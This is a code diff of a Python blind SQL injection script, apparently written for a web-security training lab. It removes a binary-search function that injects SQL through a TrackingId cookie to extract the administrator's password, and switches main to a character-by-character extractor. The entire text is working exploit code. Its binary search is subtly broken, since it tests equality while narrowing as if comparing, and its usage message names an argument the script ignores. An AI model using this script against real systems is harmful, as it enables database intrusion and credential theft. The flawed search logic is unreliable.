@@ -50,36 +50,13 @@ def sqli_passwordFor(url):
                 sys.stdout.flush()
                 break
 
-def sqli_passwordBinary(url):
-    password_extracted = ""
-    for i in range(1, 21):
-        low = 32
-        high = 126
-        password_char = ""
-        while low <= high:
-            mid = (low + high) // 2
-            sqli_payload = "' and (select ascii (substring(password, %s, 1)) from users where username = 'administrator') = '%s' --" % (i, mid)
-            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-            cookies = {
-                'TrackingId': 'NTt4bFEQYbuTaetK' + sqli_payload_encoded,
-                'session': 'iorA5sCTjq8zx2XFFBBBBcxV6F1Helh5'
-            }
-            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-            if "Welcome" not in r.text:
-                password_char = chr(mid)
-                high = mid - 1 
-            else:
-                low = mid + 1  
-        password_extracted += password_char
-        sys.stdout.write('\r' + password_extracted)
-        sys.stdout.flush()
 def main(): 
     if len(sys.argv) != 2:
         print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
     url = sys.argv[1]
     print("[+] Retrieving administrator password...")
-    sqli_passwordBinary(url)
+    sqli_passwordFor(url)
     
 if __name__ == '__main__':
     main()
